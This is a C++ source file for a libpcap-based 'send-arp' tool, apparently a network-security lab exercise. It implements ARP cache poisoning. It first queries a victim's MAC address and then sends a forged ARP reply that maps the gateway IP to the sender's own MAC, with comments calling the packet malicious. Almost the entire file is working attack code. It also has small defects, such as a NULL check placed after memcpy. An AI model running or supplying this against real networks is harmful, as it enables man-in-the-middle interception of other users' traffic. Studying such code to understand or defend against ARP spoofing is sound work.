#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string>
#include <fstream>

#include <stdio.h>
#include <stdlib.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)


// include NULL.
constexpr size_t MAC_ADDR_STR_LEN = 18;	


void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp ens33\n");
}


/**
 * @brief	Get my MAC address as string.
 * 
 * @param	dev_		NIC deivce name.
 * @return	std::string	my MAC address.
 * 
 * @details	read file /sys/class/net/[dev_]/address to get MAC address of NIC device.
 */
std::string GetMyMac(const std::string dev_){
	std::string filePath = "/sys/class/net/" + dev_ + "/address";

	std::ifstream ifr;
	ifr.open(filePath, std::ifstream::in);
	if (!ifr.is_open()){
		fprintf(stderr, "can't open file %s\n", filePath.c_str());
		return "";
	}

	static std::string res;
	std::getline(ifr, res);
	ifr.close();
	
	return res;
}

/**
 * @brief Get target MAC address as string.
 * 
 * @param dev_ 			NIC deivce name.
 * @param targetIP_ 	target IP address.
 * @return std::string	target MAC address.
 * 
 * @details	Send ARP req packet to target, get ARP rep packet,
 * 			and get target MAC address from ARP rep packet.
 */
std::string GetTargetMac(const char* dev_, const std::string myMac_, const std::string targetIP_){
	char errbuf[PCAP_ERRBUF_SIZE];

	// modified params to use pcap_next_ex().
	pcap_t* handle = pcap_open_live(dev_, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev_, errbuf);
		return "";
	}

	// normal ARP req packet.
	EthArpPacket packetArpReq;

	// broadcast
	packetArpReq.eth_.smac_ = Mac(myMac_);
	packetArpReq.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");

	packetArpReq.eth_.type_ = htons(EthHdr::Arp);
	packetArpReq.arp_.hrd_ = htons(ArpHdr::ETHER);
	packetArpReq.arp_.pro_ = htons(EthHdr::Ip4);
	packetArpReq.arp_.hln_ = Mac::SIZE;
	packetArpReq.arp_.pln_ = Ip::SIZE;
	packetArpReq.arp_.op_ = htons(ArpHdr::Request);

	// fake source ip to hide my origin ip.
	packetArpReq.arp_.smac_ = Mac(myMac_);
	packetArpReq.arp_.sip_ = htonl(Ip("0.0.0.0"));

	packetArpReq.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packetArpReq.arp_.tip_ = htonl(Ip(targetIP_));

	// send normal ARP req packet.
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packetArpReq), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return "";
	}

	// receive ARP rep packet.
	struct pcap_pkthdr* header;
	const u_char* packetArpRepRaw;
	res = pcap_next_ex(handle, &header, &packetArpRepRaw);
	if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
		printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
		return "";
	}

	// get target MAC address from ARP rep packet.
	EthArpPacket* packetArpRep = (EthArpPacket*)malloc(header->caplen);
	memcpy(packetArpRep, packetArpRepRaw, header->caplen);
	if (packetArpRep == NULL){
		return "";
	}

	pcap_close(handle);

	std::string targetMac(packetArpRep->arp_.smac_);
	free(packetArpRep);
	
	return targetMac;
}


int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	const std::string myMac = GetMyMac(argv[1]);
	if (myMac == ""){
		fprintf(stderr, "couldn't get my MAC address\n");
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	// generate malicious ARP rep packet.
	EthArpPacket packet;
	std::string targetMac = GetTargetMac(dev, myMac, argv[2]);
	if (targetMac == ""){
		fprintf(stderr, "couldn't get target MAC address\n");
		return -1;
	}

	packet.eth_.dmac_ = Mac(targetMac);			// Target MAC
	packet.eth_.smac_ = Mac(myMac);				// My MAC
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);		// gen ARP rep packet.
	packet.arp_.smac_ = Mac(myMac);				// My MAC
	packet.arp_.sip_ = htonl(Ip(argv[3]));		// GW IP
	packet.arp_.tmac_ = Mac(targetMac);			// Target MAC
	packet.arp_.tip_ = htonl(Ip(argv[2]));		// Target IP

	// poisoning target ARP table.
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}